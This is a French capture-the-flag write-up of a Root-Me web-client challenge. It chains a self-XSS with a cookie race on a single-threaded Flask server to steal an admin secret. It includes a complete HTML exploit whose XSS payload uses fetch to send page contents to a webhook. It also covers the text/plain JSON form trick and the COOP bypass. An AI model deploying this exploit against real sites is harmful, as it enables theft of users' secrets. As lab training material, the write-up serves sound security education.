# Self XSS - Race Condition (60 Points)

## Challenge

**Plateforme** : Root-Me  
**Categorie** : Web Client  
**Auteur** : Mizu  
**URL** : `https://web-client-ch6.challenge01.root-me.org:58006`

L'application "Secrets Keeper v2" permet de se connecter avec un username et un secret. Le secret est stocke dans la session (cookie signe Flask). L'objectif est de voler le secret de l'admin.

## Reconnaissance

### Page /login

Le formulaire de login utilise `fetch` avec `Content-Type: application/json` au lieu d'un formulaire HTML classique :

```javascript
fetch("/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({"username": username.value, "secret": secret.value})
}).then(() => { location = "/profile"; })
```

Headers de securite :
- `Cross-Origin-Opener-Policy: same-origin` (casse `window.opener` cross-origin)
- `X-Frame-Options: deny` (bloque les iframes)

### Page /profile

Le secret est rendu **cote serveur** dans le HTML initial :

```html
<section id="text">
    <p>Welcome {username}, your secret is safe thanks to our no database system.</p>
    <p>Everything is stored in your session so, no one can steal it!</p>
    <br>
    <p><u>Your secret</u>: ADMIN_SECRET_ICI</p>
</section>
```

Mais le username est charge **cote client** via une requete separee :

```javascript
window.onload = () => {
    fetch(/api/me).then(d => d.json()).then((d) => {
        text.innerHTML = text.innerHTML.replace("{username}", d.username);
    })
}
```

Le username est injecte via `innerHTML` sans sanitisation -> **Self-XSS**.

### /api/me

Retourne simplement `{"username":"..."}` en JSON.

## Analyse de la vulnerabilite

Deux requetes distinctes construisent la page /profile :

1. **GET /profile** : le HTML contient le **secret** (rendu cote serveur avec le cookie actuel)
2. **GET /api/me** : retourne le **username** (requete client-side avec le cookie actuel)

Si on change le cookie de session **entre** ces deux requetes :
- Le HTML de /profile contient le **secret de l'admin** (ancien cookie)
- /api/me retourne **notre username XSS** (nouveau cookie)
- Le XSS s'execute dans une page qui affiche le secret admin

C'est la **race condition**.

## Protections en place vs. le challenge precedent

| Protection | Impact |
|---|---|
| `Cross-Origin-Opener-Policy: same-origin` | `window.opener` est coupe entre origines differentes -> l'ancien exploit (popup + opener.document) ne marche plus |
| `X-Frame-Options: deny` | Impossible de charger les pages dans des iframes |
| Login via `fetch` + JSON | Le serveur attend du JSON, pas du form-encoded classique |

## Exploitation

### Serveur single-threaded

Le serveur est Werkzeug (dev server Python), qui est **single-threaded** par defaut. Il traite une seule requete a la fois. Si on envoie un POST avec un **body enorme** (3MB de padding), le serveur est bloque pendant la lecture du body. Toute requete suivante est mise en file d'attente.

### Astuce enctype=text/plain

Un formulaire HTML avec `enctype="text/plain"` envoie le body au format `name=value`. En choisissant le `name` et la `value` d'un input, on fabrique un body JSON valide :

```
name:  {"username":"XSS","secret":"x","pad":"
value: AAAA...AAAA"}
```

Body envoye : `{"username":"XSS","secret":"x","pad":"=AAAA...AAAA"}`

C'est du JSON parsable. Le serveur l'accepte avec `Content-Type: text/plain` (confirme par test curl).

### Timeline de l'attaque

```
t=0ms     Le bot (admin) visite notre exploit
          -> Ouverture d'une popup (about:blank)
          -> Soumission du form POST /login avec 3MB de padding via la popup

t=200ms   Navigation du main window vers /profile
          -> GET /profile part avec le cookie admin (POST pas encore fini)
          -> Requete en file d'attente sur le serveur single-threaded

t=~2-3s   Le serveur finit de lire les 3MB du POST
          -> Set-Cookie: session={username:"<XSS>", secret:"x"}
          -> Le cookie admin est ecrase dans le cookie jar du navigateur

          Le serveur traite le GET /profile (en file d'attente)
          -> Le cookie dans les HEADERS de la requete est toujours l'admin cookie
             (il a ete copie au moment de l'envoi, pas au moment du traitement)
          -> Le HTML retourne contient le SECRET DE L'ADMIN

t=~3s     /profile se charge dans le navigateur
          -> window.onload fire
          -> fetch /api/me part avec le NOUVEAU cookie (XSS user)
          -> Retourne {"username":"<img src=x onerror=...>"}
          -> innerHTML injecte le tag <img>
          -> onerror fire, lit le secret admin depuis le DOM
          -> Exfiltration vers webhook
```

### Exploit final

```html
<!DOCTYPE html>
<html>
<body>
<script>
var challenge = "https://web-client-ch6.challenge01.root-me.org:58006";
var webhook = "https://webhook.site/VOTRE_WEBHOOK_ID";

// XSS payload : lit le secret depuis #text et l'exfiltre
var xss = "<img src=x onerror=fetch('" + webhook
    + "?d='+btoa(document.getElementById('text').innerText))>";

// Ouvrir une popup pour y envoyer le POST
var w = window.open("about:blank", "loginWin");

// Creer le form POST /login avec enctype=text/plain (JSON trick)
var form = document.createElement("form");
form.method = "POST";
form.action = challenge + "/login";
form.enctype = "text/plain";
form.target = "loginWin";

var input = document.createElement("input");
input.type = "hidden";
// Body JSON : {"username":"<XSS>","secret":"x","pad":"=AAAA..."}
input.name = '{"username":"' + xss + '","secret":"x","pad":"';
input.value = "A".repeat(3000000) + '"}';

form.appendChild(input);
document.body.appendChild(form);
form.submit();

// Naviguer vers /profile apres que le POST ait demarre
// Le serveur single-threaded est occupe -> GET /profile en file d'attente
setTimeout(function() {
    location.href = challenge + "/profile";
}, 200);
</script>
</body>
</html>
```

### Deploiement et execution

```bash
# Deployer sur un hebergeur statique (surge, ngrok, etc.)
surge --project . --domain mon-exploit.surge.sh

# Soumettre l'URL au bot via /report sur le challenge
# -> https://mon-exploit.surge.sh
```

### Resultat sur webhook

```
GET /?d=V2VsY29tZQ...WxhZw==
```

Decode en base64 :
```
Welcome
, your secret is safe thanks to our no database system.
...
Your secret: FLAG{...}
```

## Concepts cles

- **Self-XSS** : XSS qui ne s'execute que dans sa propre session (ici via le username dans innerHTML)
- **Race Condition** : exploiter le decalage temporel entre deux requetes qui utilisent des cookies differents
- **COOP bypass** : contourner `Cross-Origin-Opener-Policy: same-origin` en n'utilisant pas `opener` mais un `form target` + cookie jar partage
- **enctype=text/plain JSON trick** : envoyer du JSON valide via un formulaire HTML standard
- **Single-threaded server abuse** : utiliser un body volumineux pour bloquer le serveur et controler l'ordre de traitement des requetes
